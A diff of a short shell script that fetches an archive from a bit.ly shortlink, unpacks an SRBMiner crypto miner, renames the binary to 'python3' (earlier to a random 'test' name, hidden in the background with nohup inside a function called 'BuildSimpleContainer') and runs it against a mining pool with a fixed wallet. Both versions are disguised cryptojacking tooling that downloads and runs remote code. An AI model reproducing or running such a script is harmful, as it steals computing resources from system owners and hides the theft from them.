@@ -1,19 +1,13 @@
-#!/bin/bash
-function BuildSimpleContainer ()
-{
+wget https://bit.ly/kontolrum
 
-kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
+tar -xvf kontolrum
 
-wget -O dot wget -O dot bit.ly/KONTOL-AKU-GEDE
+cd SRBMiner-Multi-2-4-7
 
-tar -xzvf dot
+mv SRBMiner-MULTI python3
 
-rm dot
+nomer=$((RANDOM % 50 + 1))
 
-cd dotsrb
+clear
 
-mv python3 test$kolot
-
-nohup ./test$kolot -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOT-$kolot > /dev/null 2>&1 &
-}   
-BuildSimpleContainer
+./python3 --algorithm randomtuske --pool luckyynr.us.to:443 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
